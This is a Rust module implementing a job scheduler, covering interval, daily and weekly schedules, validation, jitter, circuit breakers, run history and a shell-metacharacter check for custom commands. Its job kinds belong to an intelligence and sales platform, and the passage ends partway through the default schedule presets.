//! Generic job scheduler — cron-like scheduling, job registry, execution tracking.
//!
//! Purely functional scheduling logic: no tokio spawns here.
//! The caller (main loop) drives ticks; this module decides *what* to run and *when*.

use chrono::{DateTime, Datelike, NaiveTime, Utc, Weekday};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::LazyLock;
use uuid::Uuid;

/// Default job timeout in seconds, overridable via `JOB_TIMEOUT_SECS` env var.
static JOB_TIMEOUT_SECS: LazyLock<u64> = LazyLock::new(|| {
    std::env::var("JOB_TIMEOUT_SECS")
        .ok()
        .and_then(|v| v.parse().ok())
        .unwrap_or(1800)
});

// ────────────────────────────────────────────
// Constants
// ────────────────────────────────────────────

/// Minimum allowed interval for `Schedule::IntervalSecs` (B233).
/// Prevents misconfigured sub-minute intervals from flooding the system.
pub const MIN_INTERVAL_SECS: u64 = 60;

/// Minimum interval for custom jobs to avoid abuse and accidental hot loops (B314).
pub const MIN_CUSTOM_JOB_INTERVAL_SECS: u64 = 300;

// ────────────────────────────────────────────
// Schedule spec
// ────────────────────────────────────────────

/// When a job should fire.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum Schedule {
    /// Run every N seconds.
    IntervalSecs(u64),
    /// Run once per day at the given hour (0-23) and minute (0-59), UTC.
    DailyAt { hour: u32, minute: u32 },
    /// Run once per week on the given weekday at the given time, UTC.
    WeeklyOn {
        day: IsoWeekday,
        hour: u32,
        minute: u32,
    },
}

impl Schedule {
    /// Validate schedule parameters for sanity (B233, B234).
    ///
    /// Returns `Err` with a human-readable message for:
    /// - `IntervalSecs` below `MIN_INTERVAL_SECS`
    /// - `DailyAt` / `WeeklyOn` with `hour > 23` or `minute > 59`
    pub fn validate(&self) -> Result<(), String> {
        match self {
            Schedule::IntervalSecs(secs) => {
                if *secs < MIN_INTERVAL_SECS {
                    return Err(format!(
                        "interval {}s is below minimum {}s — use a longer interval to avoid thundering herd",
                        secs, MIN_INTERVAL_SECS
                    ));
                }
            }
            Schedule::DailyAt { hour, minute } => {
                if *hour > 23 {
                    return Err(format!("hour {} is out of range 0-23", hour));
                }
                if *minute > 59 {
                    return Err(format!("minute {} is out of range 0-59", minute));
                }
            }
            Schedule::WeeklyOn { hour, minute, .. } => {
                if *hour > 23 {
                    return Err(format!("hour {} is out of range 0-23", hour));
                }
                if *minute > 59 {
                    return Err(format!("minute {} is out of range 0-59", minute));
                }
            }
        }
        Ok(())
    }
}

/// ISO weekday (serialisable, unlike chrono::Weekday).
#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
pub enum IsoWeekday {
    Mon,
    Tue,
    Wed,
    Thu,
    Fri,
    Sat,
    Sun,
}

impl IsoWeekday {
    pub fn to_chrono(self) -> Weekday {
        match self {
            Self::Mon => Weekday::Mon,
            Self::Tue => Weekday::Tue,
            Self::Wed => Weekday::Wed,
            Self::Thu => Weekday::Thu,
            Self::Fri => Weekday::Fri,
            Self::Sat => Weekday::Sat,
            Self::Sun => Weekday::Sun,
        }
    }

    pub fn from_chrono(w: Weekday) -> Self {
        match w {
            Weekday::Mon => Self::Mon,
            Weekday::Tue => Self::Tue,
            Weekday::Wed => Self::Wed,
            Weekday::Thu => Self::Thu,
            Weekday::Fri => Self::Fri,
            Weekday::Sat => Self::Sat,
            Weekday::Sun => Self::Sun,
        }
    }
}

// ────────────────────────────────────────────
// Job identity & status
// ────────────────────────────────────────────

/// The kind of pipeline this job belongs to.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq, Hash)]
pub enum JobKind {
    CrawlCycle,
    PatternMining,
    HypothesisGeneration,
    PoiRefresh,
    PromotionBoard,
    RecipeDeprecation,
    StrategyMemo,
    FeatureDriftCheck,
    /// Adaptive source scoring — ranks crawl sources by yield and novelty.
    SourceScoring,
    /// Cross-domain signal combination mining — discovers synergistic multi-signal patterns.
    CrossDomainMining,
    /// Outcome tracking — matches predictions against observed outcomes.
    OutcomeTracking,
    /// Breach scan — checks monitored domains and emails against HIBP, IntelX, Pastebin.
    BreachScan,
    /// Sanctions screen — checks all tracked entities against OFAC SDN and EU consolidated lists.
    SanctionsScreen,
    /// SLA enforcement — re-escalates unacknowledged security warnings past their SLA deadline.
    SlaEnforcement,
    /// DNS posture scan — checks SPF/DKIM/DMARC for all tracked company domains.
    DnsPostureScan,
    /// KEV catalog fetch — downloads the CISA Known Exploited Vulnerabilities catalog.
    KevCatalogFetch,
    /// Lookalike domain scan — detects typosquat/lookalike domains for tracked companies.
    LookalikeDomainScan,
    /// Update email digest — sends top-insight update emails based on user settings.
    UpdateEmailDigest,
    /// Self-improvement cycle — runs SourceScoring + CrossDomainMining + OutcomeTracking in sequence.
    SelfImprovementCycle,
    /// Recipe fire — evaluates all active recipes against live observation data and generates insights/warnings.
    RecipeFire,
    /// POI discovery — network-expansion from existing seed POIs to find new contacts.
    PoiDiscovery,
    /// StarzCRM sync — read-only MySQL pull from collocated StarzCRM database.
    StarzCrmSync,
    /// Embedding reindex — generates vector embeddings for entities without them.
    EmbeddingReindex,
    /// Dark web forum scan — monitors breach forums, paste sites, ransomware blogs.
    DarkWebScan,
    /// AI Triage Engine — scores queued insights/warnings/alerts using LLM.
    TriageProcessing,
    /// Trend aggregation — computes materialized rollup metrics for historical trends.
    TrendAggregation,
    /// Insight generation — produces competitive intelligence insights from recent observations.
    InsightGeneration,
    /// Threat intelligence refresh — updates threat actor profiles, campaigns, and supply chain risk scores.
    ThreatIntelRefresh,
    /// Psychological profile computation — recalculates psych profiles for all POIs from current artifacts.
    PsychProfileCompute,
    /// POI role reclassification — re-derives `role_family` for every person from
    /// their `current_role` using the canonical role classifier, correcting stale
    /// seeded values (e.g. everything seeded as 'C-Suite') so procurement,
    /// supply-chain, and quality contacts are accurately categorized.
    PoiRoleReclassify,
    /// OSINT enrichment — invokes structured-source fetchers (SEC EDGAR filings,
    /// NVD/CVE vulnerabilities, RDAP domain registration, OpenAlex academic,
    /// WHOIS, DNS posture, Certificate Transparency) for tracked companies and
    /// domains. Produces typed observations with full provenance.
    OsintEnrichment,
    /// Adversarial analysis — runs placement clustering, source entropy detection, and quarantine management.
    AdversarialAnalysis,
    /// Dynamic anomaly scan — runs real statistical analysis on observation
    /// volume trends and signal diversity shifts to generate data-driven
    /// warnings that aren't tied to recipe templates.
    AnomalyScan,
    /// High-velocity social media ingestion — Reddit, Telegram, Twitter/Nitter,
    /// and Hacker News. Produces real SocialPost observations linked to entities.
    SocialScan,
    /// Tender / procurement crawler — scrapes MENA public procurement portals
    /// (Tunisia, Morocco, Egypt, UAE, KSA), filters postings for EMS/BESS
    /// relevance, and emits TenderPosted observations. Idempotent via
    /// content-hashed observation IDs.
    TenderScan,
    /// Contact-data enrichment — discovers verified email/phone/LinkedIn for
    /// tracked persons lacking contact methods, via the multi-provider
    /// (Apollo/Hunter/Clearbit/website) waterfall.
    ContactEnrichment,
    /// ICP scoring — batch-scores all non-competitor companies against the
    /// Ideal Customer Profile definition and persists fit scores + breakdowns
    /// for sales targeting ("which companies to target").
    IcpScoring,
    /// Engagement refresh — recomputes per-person outreach response rates and
    /// next-best-channel from `engagement_events`, wiring the closed feedback
    /// loop ("we contacted X, they replied Y → adjust approach").
    EngagementRefresh,
    /// Buying-center derivation — auto-builds the buying committee per account
    /// from each person's role, so "which person at the company" is populated.
    BuyingCenterDerivation,
    /// PersonMention materialization — turns PersonMention observations (OpenAlex
    /// authors, news mentions) into real `persons` rows. Bridges the gap between
    /// thousands of observed people and zero persons created.
    PersonMentionMaterialization,
    Custom(String),
}

impl JobKind {
    pub fn as_str(&self) -> &str {
        match self {
            Self::CrawlCycle => "crawl_cycle",
            Self::PatternMining => "pattern_mining",
            Self::HypothesisGeneration => "hypothesis_generation",
            Self::PoiRefresh => "poi_refresh",
            Self::PromotionBoard => "promotion_board",
            Self::RecipeDeprecation => "recipe_deprecation",
            Self::StrategyMemo => "strategy_memo",
            Self::FeatureDriftCheck => "feature_drift_check",
            Self::SourceScoring => "source_scoring",
            Self::CrossDomainMining => "cross_domain_mining",
            Self::OutcomeTracking => "outcome_tracking",
            Self::BreachScan => "breach_scan",
            Self::SanctionsScreen => "sanctions_screen",
            Self::SlaEnforcement => "sla_enforcement",
            Self::DnsPostureScan => "dns_posture_scan",
            Self::KevCatalogFetch => "kev_catalog_fetch",
            Self::LookalikeDomainScan => "lookalike_domain_scan",
            Self::UpdateEmailDigest => "update_email_digest",
            Self::SelfImprovementCycle => "self_improvement_cycle",
            Self::RecipeFire => "recipe_fire",
            Self::PoiDiscovery => "poi_discovery",
            Self::StarzCrmSync => "starzcrm_sync",
            Self::EmbeddingReindex => "embedding_reindex",
            Self::DarkWebScan => "dark_web_scan",
            Self::TriageProcessing => "triage_processing",
            Self::TrendAggregation => "trend_aggregation",
            Self::InsightGeneration => "insight_generation",
            Self::ThreatIntelRefresh => "threat_intel_refresh",
            Self::PsychProfileCompute => "psych_profile_compute",
            Self::PoiRoleReclassify => "poi_role_reclassify",
            Self::OsintEnrichment => "osint_enrichment",
            Self::AdversarialAnalysis => "adversarial_analysis",
            Self::AnomalyScan => "anomaly_scan",
            Self::SocialScan => "social_scan",
            Self::TenderScan => "tender_scan",
            Self::ContactEnrichment => "contact_enrichment",
            Self::IcpScoring => "icp_scoring",
            Self::EngagementRefresh => "engagement_refresh",
            Self::BuyingCenterDerivation => "buying_center_derivation",
            Self::PersonMentionMaterialization => "person_mention_materialization",
            Self::Custom(s) => s.as_str(),
        }
    }

    /// Parse a job kind from its string representation.
    pub fn from_str(s: &str) -> Self {
        match s {
            "crawl_cycle" => Self::CrawlCycle,
            "pattern_mining" => Self::PatternMining,
            "hypothesis_generation" => Self::HypothesisGeneration,
            "poi_refresh" => Self::PoiRefresh,
            "promotion_board" => Self::PromotionBoard,
            "recipe_deprecation" => Self::RecipeDeprecation,
            "strategy_memo" => Self::StrategyMemo,
            "feature_drift_check" => Self::FeatureDriftCheck,
            "source_scoring" => Self::SourceScoring,
            "cross_domain_mining" => Self::CrossDomainMining,
            "outcome_tracking" => Self::OutcomeTracking,
            "breach_scan" => Self::BreachScan,
            "sanctions_screen" => Self::SanctionsScreen,
            "sla_enforcement" => Self::SlaEnforcement,
            "dns_posture_scan" => Self::DnsPostureScan,
            "kev_catalog_fetch" => Self::KevCatalogFetch,
            "lookalike_domain_scan" => Self::LookalikeDomainScan,
            "update_email_digest" => Self::UpdateEmailDigest,
            "self_improvement_cycle" => Self::SelfImprovementCycle,
            "recipe_fire" => Self::RecipeFire,
            "poi_discovery" => Self::PoiDiscovery,
            "starzcrm_sync" => Self::StarzCrmSync,
            "embedding_reindex" => Self::EmbeddingReindex,
            "dark_web_scan" => Self::DarkWebScan,
            "triage_processing" => Self::TriageProcessing,
            "trend_aggregation" => Self::TrendAggregation,
            "insight_generation" => Self::InsightGeneration,
            "threat_intel_refresh" => Self::ThreatIntelRefresh,
            "psych_profile_compute" => Self::PsychProfileCompute,
            "poi_role_reclassify" => Self::PoiRoleReclassify,
            "osint_enrichment" => Self::OsintEnrichment,
            "adversarial_analysis" => Self::AdversarialAnalysis,
            "anomaly_scan" => Self::AnomalyScan,
            "social_scan" => Self::SocialScan,
            "tender_scan" => Self::TenderScan,
            "contact_enrichment" => Self::ContactEnrichment,
            "icp_scoring" => Self::IcpScoring,
            "engagement_refresh" => Self::EngagementRefresh,
            "buying_center_derivation" => Self::BuyingCenterDerivation,
            "person_mention_materialization" => Self::PersonMentionMaterialization,
            other => Self::Custom(other.to_string()),
        }
    }
}

/// Execution status of a single job run.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum JobStatus {
    Pending,
    Running,
    Succeeded { duration_ms: u64 },
    Failed { error: String, duration_ms: u64 },
    Skipped { reason: String },
}

impl JobStatus {
    pub fn is_terminal(&self) -> bool {
        matches!(
            self,
            Self::Succeeded { .. } | Self::Failed { .. } | Self::Skipped { .. }
        )
    }
}

/// A single run record.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct JobRun {
    pub run_id: String,
    pub kind: JobKind,
    pub status: JobStatus,
    pub started_at: DateTime<Utc>,
    pub finished_at: Option<DateTime<Utc>>,
    pub items_processed: u64,
    pub notes: String,
}

impl JobRun {
    pub fn new(kind: JobKind) -> Self {
        Self {
            run_id: Uuid::new_v4().to_string(),
            kind,
            status: JobStatus::Pending,
            started_at: Utc::now(),
            finished_at: None,
            items_processed: 0,
            notes: String::new(),
        }
    }

    pub fn start(&mut self) {
        self.status = JobStatus::Running;
        self.started_at = Utc::now();
    }

    pub fn succeed(&mut self, items: u64, notes: &str) {
        let elapsed = Utc::now()
            .signed_duration_since(self.started_at)
            .num_milliseconds()
            .max(0) as u64;
        self.status = JobStatus::Succeeded {
            duration_ms: elapsed,
        };
        self.finished_at = Some(Utc::now());
        self.items_processed = items;
        self.notes = notes.to_string();
    }

    pub fn fail(&mut self, error: &str) {
        let elapsed = Utc::now()
            .signed_duration_since(self.started_at)
            .num_milliseconds()
            .max(0) as u64;
        self.status = JobStatus::Failed {
            error: error.to_string(),
            duration_ms: elapsed,
        };
        self.finished_at = Some(Utc::now());
        self.notes = error.to_string();
    }

    pub fn skip(&mut self, reason: &str) {
        let reason_code = skip_reason_code(reason);
        tracing::warn!(
            run_id = %self.run_id,
            job = self.kind.as_str(),
            reason_code = %reason_code,
            reason = %reason,
            "job_skipped"
        );
        self.status = JobStatus::Skipped {
            reason: reason.to_string(),
        };
        self.finished_at = Some(Utc::now());
    }

    /// Compute the duration in milliseconds.
    ///
    /// For terminal statuses (`Succeeded`, `Failed`), returns the value that
    /// was measured and stored at completion time.
    ///
    /// For live (`Pending`, `Running`) statuses, computes elapsed time from
    /// `started_at` to now, clamped to `0` so that backward clock skew
    /// (where `now < started_at`) never causes unsigned-integer underflow
    /// (B232).
    pub fn duration_ms(&self) -> u64 {
        match &self.status {
            JobStatus::Succeeded { duration_ms } => *duration_ms,
            JobStatus::Failed { duration_ms, .. } => *duration_ms,
            _ => Utc::now()
                .signed_duration_since(self.started_at)
                .num_milliseconds()
                .max(0) as u64,
        }
    }
}

fn skip_reason_code(reason: &str) -> String {
    let mut code = String::new();
    for ch in reason.chars() {
        if ch.is_ascii_alphanumeric() {
            code.push(ch.to_ascii_uppercase());
        } else if !code.ends_with('_') {
            code.push('_');
        }
    }
    let trimmed = code.trim_matches('_');
    if trimmed.is_empty() {
        "UNSPECIFIED".to_string()
    } else {
        trimmed.to_string()
    }
}

// ────────────────────────────────────────────
// Registered job definition
// ────────────────────────────────────────────

/// A registered job: its schedule + bookkeeping.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct JobDef {
    pub kind: JobKind,
    pub schedule: Schedule,
    pub enabled: bool,
    pub last_run: Option<DateTime<Utc>>,
    pub last_status: Option<JobStatus>,
    pub consecutive_failures: u32,
    pub max_consecutive_failures: u32,
    /// Fixed offset (seconds) added to the nominal interval to stagger this
    /// job relative to others with the same period, preventing thundering-herd
    /// (B231). For `DailyAt`/`WeeklyOn`, offsets are applied to the minute.
    #[serde(default)]
    pub jitter_offset_secs: u32,
    /// Per-job hard wall-clock timeout in seconds. The caller is responsible
    /// for aborting execution after this duration (B237).
    #[serde(default)]
    pub timeout_secs: Option<u64>,
    /// Maximum concurrent executions permitted for this job kind at once.
    /// Callers must enforce this; the scheduler tracks intent only (B242).
    #[serde(default = "JobDef::default_max_concurrent")]
    pub max_concurrent: u32,
}

impl JobDef {
    pub fn new(kind: JobKind, schedule: Schedule) -> Self {
        Self {
            kind,
            schedule,
            enabled: true,
            last_run: None,
            last_status: None,
            consecutive_failures: 0,
            max_consecutive_failures: 5,
            jitter_offset_secs: 0,
            timeout_secs: None,
            max_concurrent: 1,
        }
    }

    fn default_max_concurrent() -> u32 {
        1
    }

    /// Set a deterministic jitter offset in seconds (B231).
    /// Use different values per job to spread concurrent firings across ticks.
    pub fn with_jitter(mut self, offset_secs: u32) -> Self {
        self.jitter_offset_secs = offset_secs;
        self
    }

    /// Set a per-job execution wall-clock timeout in seconds (B237).
    pub fn with_timeout(mut self, secs: u64) -> Self {
        self.timeout_secs = Some(secs);
        self
    }

    /// Set the maximum concurrency for this job kind (B242).
    pub fn with_max_concurrent(mut self, n: u32) -> Self {
        self.max_concurrent = n.max(1); // never allow 0
        self
    }

    /// Record a completed run.
    pub fn record_run(&mut self, run: &JobRun) {
        self.last_run = run.finished_at.or(Some(Utc::now()));
        self.last_status = Some(run.status.clone());
        match &run.status {
            JobStatus::Failed { .. } => {
                self.consecutive_failures += 1;
                if self.consecutive_failures >= self.max_consecutive_failures {
                    self.enabled = false;
                    tracing::warn!(
                        "{} disabled after {} consecutive failures",
                        self.kind.as_str(),
                        self.consecutive_failures
                    );
                }
            }
            JobStatus::Succeeded { .. } => {
                self.consecutive_failures = 0;
            }
            _ => {}
        }
    }

    /// Has this job been auto-disabled due to repeated failures?
    pub fn is_circuit_broken(&self) -> bool {
        !self.enabled && self.consecutive_failures >= self.max_consecutive_failures
    }

    /// Reset the circuit breaker (operator override).
    ///
    /// Emits a structured `WARN` log for auditability — operators should be
    /// able to trace every manual override in the logs (B236).
    pub fn reset_circuit_breaker(&mut self) {
        tracing::warn!(
            job = self.kind.as_str(),
            previous_consecutive_failures = self.consecutive_failures,
            was_enabled = self.enabled,
            "circuit_breaker_reset: operator override — consecutive failure counter cleared"
        );
        self.consecutive_failures = 0;
        self.enabled = true;
    }
}

// ────────────────────────────────────────────
// Scheduler (the brain)
// ────────────────────────────────────────────

/// Pure-function scheduler: given the current time, decides which jobs are due.
///
/// # Thread-safety (B281)
///
/// `Scheduler` is **not** `Sync` — it is designed for exclusive ownership by a
/// single scheduler task or event loop.  `&mut Scheduler` methods (`register`,
/// `record`, `due_jobs`) must not be called concurrently.
///
/// If multiple tasks need to query the scheduler, the caller must wrap it in an
/// `Arc<tokio::sync::Mutex<Scheduler>>` or a dedicated actor channel.  The
/// `Clone` derive supports state-snapshot patterns for observability without
/// locking the live instance.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Scheduler {
    pub jobs: HashMap<String, JobDef>,
    pub history: Vec<JobRun>,
    pub max_history: usize,
}

impl Default for Scheduler {
    fn default() -> Self {
        Self {
            jobs: HashMap::new(),
            history: Vec::new(),
            max_history: 1000,
        }
    }
}

impl Scheduler {
    pub fn new() -> Self {
        Self::default()
    }

    /// Register a job. Returns false if one with the same key already exists
    /// OR the schedule fails validation (B233, B234).
    pub fn register(&mut self, def: JobDef) -> bool {
        // Validate schedule before accepting registration
        if let Err(msg) = def.schedule.validate() {
            tracing::warn!(
                job = def.kind.as_str(),
                error = %msg,
                "refusing to register job with invalid schedule"
            );
            return false;
        }
        if matches!(def.kind, JobKind::Custom(_)) {
            if let Schedule::IntervalSecs(secs) = def.schedule {
                if secs < MIN_CUSTOM_JOB_INTERVAL_SECS {
                    tracing::warn!(
                        job = def.kind.as_str(),
                        interval_secs = secs,
                        min_interval_secs = MIN_CUSTOM_JOB_INTERVAL_SECS,
                        "refusing to register custom job with too-frequent interval"
                    );
                    return false;
                }
            }
        }
        let key = def.kind.as_str().to_string();
        if self.jobs.contains_key(&key) {
            return false;
        }
        self.jobs.insert(key, def);
        true
    }

    /// Unregister a job by kind.
    pub fn unregister(&mut self, kind: &JobKind) -> bool {
        self.jobs.remove(kind.as_str()).is_some()
    }

    /// Return the list of job kinds that are due to run at `now`.
    ///
    /// Jobs that are still in `Running` state are excluded to prevent
    /// overlapping parallel executions of the same job (B238).
    /// Jitter offsets are applied per-job to spread thundering-herd (B231).
    pub fn due_jobs(&self, now: DateTime<Utc>) -> Vec<JobKind> {
        self.jobs
            .values()
            .filter(|def| {
                if !def.enabled {
                    return false;
                }
                // B238: never schedule a second run while the first is still in-flight
                if matches!(def.last_status.as_ref(), Some(JobStatus::Running)) {
                    tracing::debug!(
                        job = def.kind.as_str(),
                        "skipping due check: previous run still Running"
                    );
                    return false;
                }
                is_due_with_jitter(&def.schedule, def.last_run, now, def.jitter_offset_secs)
            })
            .map(|def| def.kind.clone())
            .collect()
    }

    /// Record a completed run in history and update the job definition.
    pub fn record_run(&mut self, run: JobRun) {
        let key = run.kind.as_str().to_string();
        if let Some(def) = self.jobs.get_mut(&key) {
            def.record_run(&run);
        }
        self.history.push(run);
        // Trim history
        if self.history.len() > self.max_history {
            let excess = self.history.len() - self.max_history;
            self.history.drain(0..excess);
        }
    }

    /// Get all runs for a given job kind.
    pub fn runs_for(&self, kind: &JobKind) -> Vec<&JobRun> {
        self.history.iter().filter(|r| &r.kind == kind).collect()
    }

    /// Success rate for a given job kind over the last N runs.
    pub fn success_rate(&self, kind: &JobKind, last_n: usize) -> f64 {
        let runs: Vec<&JobRun> = self
            .history
            .iter()
            .rev()
            .filter(|r| &r.kind == kind)
            .take(last_n)
            .collect();
        if runs.is_empty() {
            return 0.0;
        }
        let ok = runs
            .iter()
            .filter(|r| matches!(r.status, JobStatus::Succeeded { .. }))
            .count();
        ok as f64 / runs.len() as f64
    }

    /// Average duration (ms) for a given job kind over the last N runs.
    pub fn avg_duration_ms(&self, kind: &JobKind, last_n: usize) -> f64 {
        let durations: Vec<u64> = self
            .history
            .iter()
            .rev()
            .filter(|r| &r.kind == kind && r.status.is_terminal())
            .take(last_n)
            .map(|r| r.duration_ms())
            .collect();
        if durations.is_empty() {
            return 0.0;
        }
        durations.iter().sum::<u64>() as f64 / durations.len() as f64
    }

    /// Summary of all registered jobs.
    pub fn status_summary(&self) -> Vec<JobSummary> {
        self.jobs
            .values()
            .map(|def| JobSummary {
                kind: def.kind.clone(),
                enabled: def.enabled,
                last_run: def.last_run,
                last_status: def.last_status.clone(),
                consecutive_failures: def.consecutive_failures,
                success_rate_last10: self.success_rate(&def.kind, 10),
                avg_duration_ms_last10: self.avg_duration_ms(&def.kind, 10),
            })
            .collect()
    }
}

/// Lightweight snapshot of a [`JobDef`] for dashboard and health-check endpoints.
///
/// Contains all the bookkeeping an operator needs to understand job health at
/// a glance — recent success rate, average latency, and last status — without
/// exposing the full schedule definition.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct JobSummary {
    pub kind: JobKind,
    pub enabled: bool,
    pub last_run: Option<DateTime<Utc>>,
    pub last_status: Option<JobStatus>,
    pub consecutive_failures: u32,
    pub success_rate_last10: f64,
    pub avg_duration_ms_last10: f64,
}

// ────────────────────────────────────────────
// Custom command validation (B250)
// ────────────────────────────────────────────

/// Allowed characters in a custom job name (alphanumeric plus hyphen/underscore).
pub const CUSTOM_JOB_NAME_ALLOWED: &str =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-";

/// Validate a custom job command name and its resolved command string (B250).
///
/// Rules:
/// - `name` must be non-empty and contain only alphanumeric, `_`, `-` chars.
/// - `command` must be non-empty after trimming.
/// - `command` must not contain shell metacharacters that could enable
///   injection (`; & | $ \` ( ) < > " '`).
/// - `command` must start with a token from `allowlist`.
///
/// Returns `Ok(())` if all checks pass.
pub fn validate_custom_command(
    name: &str,
    command: &str,
    allowlist: &[&str],
) -> Result<(), String> {
    if name.is_empty() {
        return Err("custom job name must not be empty".to_string());
    }
    if !name.chars().all(|c| CUSTOM_JOB_NAME_ALLOWED.contains(c)) {
        return Err(format!(
            "custom job name {:?} contains disallowed characters — only [A-Za-z0-9_-] are permitted",
            name
        ));
    }
    let cmd = command.trim();
    if cmd.is_empty() {
        return Err(format!(
            "custom job command for {:?} must not be empty",
            name
        ));
    }
    // Reject shell injection metacharacters
    const FORBIDDEN: &[char] = &[';', '&', '|', '$', '`', '(', ')', '<', '>', '"', '\''];
    if let Some(bad) = cmd.chars().find(|c| FORBIDDEN.contains(c)) {
        return Err(format!(
            "custom job command for {:?} contains forbidden metacharacter {:?}",
            name, bad
        ));
    }
    // Allowlist check: the first whitespace-delimited token must be in the list
    if !allowlist.is_empty() {
        let first_token = cmd.split_whitespace().next().unwrap_or("");
        if !allowlist.contains(&first_token) {
            return Err(format!(
                "custom job command {:?} binary {:?} not in allowlist",
                name, first_token
            ));
        }
    }
    Ok(())
}

/// Is a job due to run at `now`, given its schedule and when it last ran?
/// Applies a fixed jitter offset to spread jobs that share the same nominal
/// schedule period, preventing thundering-herd (B231).
///
/// For `IntervalSecs`, the effective threshold is `interval + jitter_offset`.
/// For time-based schedules, the jitter is expressed in whole minutes
/// (i.e., `jitter_offset_secs / 60`, rounded down).
pub fn is_due_with_jitter(
    schedule: &Schedule,
    last_run: Option<DateTime<Utc>>,
    now: DateTime<Utc>,
    jitter_offset_secs: u32,
) -> bool {
    match schedule {
        Schedule::IntervalSecs(secs) => {
            let Some(last) = last_run else {
                return true; // never ran → due immediately regardless of jitter
            };
            let effective_interval = secs.saturating_add(jitter_offset_secs as u64);
            let elapsed = now.signed_duration_since(last).num_seconds();
            elapsed >= effective_interval as i64
        }
        Schedule::DailyAt { hour, minute } => {
            let jitter_minutes = jitter_offset_secs / 60;
            let total_minutes = *minute + jitter_minutes;
            let effective_minute = total_minutes % 60;
            let effective_hour = (*hour + total_minutes / 60) % 24;
            is_due(
                &Schedule::DailyAt {
                    hour: effective_hour,
                    minute: effective_minute,
                },
                last_run,
                now,
            )
        }
        Schedule::WeeklyOn { day, hour, minute } => {
            let jitter_minutes = jitter_offset_secs / 60;
            let total_minutes = *minute + jitter_minutes;
            let effective_minute = total_minutes % 60;
            let effective_hour = (*hour + total_minutes / 60) % 24;
            is_due(
                &Schedule::WeeklyOn {
                    day: *day,
                    hour: effective_hour,
                    minute: effective_minute,
                },
                last_run,
                now,
            )
        }
    }
}

/// Is a job due to run at `now`, given its schedule and when it last ran?
pub fn is_due(schedule: &Schedule, last_run: Option<DateTime<Utc>>, now: DateTime<Utc>) -> bool {
    match schedule {
        Schedule::IntervalSecs(secs) => {
            let Some(last) = last_run else {
                return true; // never ran → due immediately
            };
            let elapsed = now.signed_duration_since(last).num_seconds();
            elapsed >= *secs as i64
        }
        Schedule::DailyAt { hour, minute } => {
            let target = NaiveTime::from_hms_opt(*hour, *minute, 0).unwrap_or_default();
            let now_time = now.time();
            let now_date = now.date_naive();

            match last_run {
                None => {
                    // Never ran — due if we're at or past the target time today
                    now_time >= target
                }
                Some(last) => {
                    let last_date = last.date_naive();
                    if now_time < target {
                        return false; // not yet today's scheduled time
                    }
                    // Due if: new day and past target time,
                    // OR same day but last run was before target and now is at/past target
                    if now_date > last_date {
                        return true;
                    }
                    if now_date == last_date && last.time() < target {
                        return true;
                    }
                    false
                }
            }
        }
        Schedule::WeeklyOn { day, hour, minute } => {
            let target_day = day.to_chrono();
            let target_time = NaiveTime::from_hms_opt(*hour, *minute, 0).unwrap_or_default();
            let now_weekday = now.weekday();
            let now_date = now.date_naive();

            // Compute the most recent occurrence of the target weekday
            // so that missed days get a catch-up fire instead of being lost.
            let now_num = now_weekday.num_days_from_monday();
            let target_num = target_day.num_days_from_monday();
            let days_since_target = if now_num >= target_num {
                (now_num - target_num) as i64
            } else {
                (7 - (target_num - now_num)) as i64
            };
            let recent_target_date = now_date - chrono::Duration::days(days_since_target);
            let recent_target = recent_target_date.and_time(target_time).and_utc();

            // Not yet reached the most recent target time
            if now < recent_target {
                return false;
            }

            match last_run {
                None => true,
                Some(last) => last < recent_target,
            }
        }
    }
}

/// Compute the next fire time for a schedule relative to `now`.
pub fn next_fire_time(schedule: &Schedule, now: DateTime<Utc>) -> DateTime<Utc> {
    match schedule {
        Schedule::IntervalSecs(secs) => now + chrono::Duration::seconds(*secs as i64),
        Schedule::DailyAt { hour, minute } => {
            let today_target = now
                .date_naive()
                .and_time(NaiveTime::from_hms_opt(*hour, *minute, 0).unwrap_or_default());
            let today_utc = today_target.and_utc();
            if now < today_utc {
                today_utc
            } else {
                // tomorrow
                let tomorrow = now.date_naive().succ_opt().unwrap_or(now.date_naive());
                tomorrow
                    .and_time(NaiveTime::from_hms_opt(*hour, *minute, 0).unwrap_or_default())
                    .and_utc()
            }
        }
        Schedule::WeeklyOn { day, hour, minute } => {
            let target_day = day.to_chrono();
            let target_time = NaiveTime::from_hms_opt(*hour, *minute, 0).unwrap_or_default();
            let now_weekday = now.weekday();
            let now_num = now_weekday.num_days_from_monday();
            let target_num = target_day.num_days_from_monday();

            let days_ahead = if target_num > now_num {
                target_num - now_num
            } else if target_num < now_num {
                7 - (now_num - target_num)
            } else {
                // same day
                let today_target = now.date_naive().and_time(target_time).and_utc();
                if now < today_target {
                    return today_target;
                }
                7 // next week
            };
            let target_date = now.date_naive() + chrono::Duration::days(days_ahead as i64);
            target_date.and_time(target_time).and_utc()
        }
    }
}

// ────────────────────────────────────────────
// Default schedule presets
// ────────────────────────────────────────────

/// Build the default nightly + weekly scheduler.
pub fn default_scheduler() -> Scheduler {
    let mut s = Scheduler::new();

    // Hourly crawl — jitter spreads retries within the hour (B231)
    s.register(
        JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(3600))
            .with_jitter(0)
            .with_timeout(3300), // 55 min hard-stop — must complete before next tick
    );

    // Nightly at 02:00 UTC; each job staggered 2 min apart (B231)
    s.register(
        JobDef::new(
            JobKind::PatternMining,
            Schedule::DailyAt { hour: 2, minute: 0 },
        )
        .with_jitter(0)
        .with_timeout(7200), // 2 h
    );

    // Hypothesis generation runs after mining (02:30 UTC) — calls LLM
    s.register(
        JobDef::new(
            JobKind::HypothesisGeneration,
            Schedule::DailyAt {
                hour: 2,
                minute: 30,
            },
        )
        .with_jitter(60) // +1 min
        .with_timeout(7200), // 2 h — LLM inference can be slow
    );

    s.register(
        JobDef::new(
            JobKind::PoiRefresh,
            Schedule::DailyAt { hour: 3, minute: 0 },
        )
        .with_jitter(120) // +2 min
        .with_timeout(3600),
    );

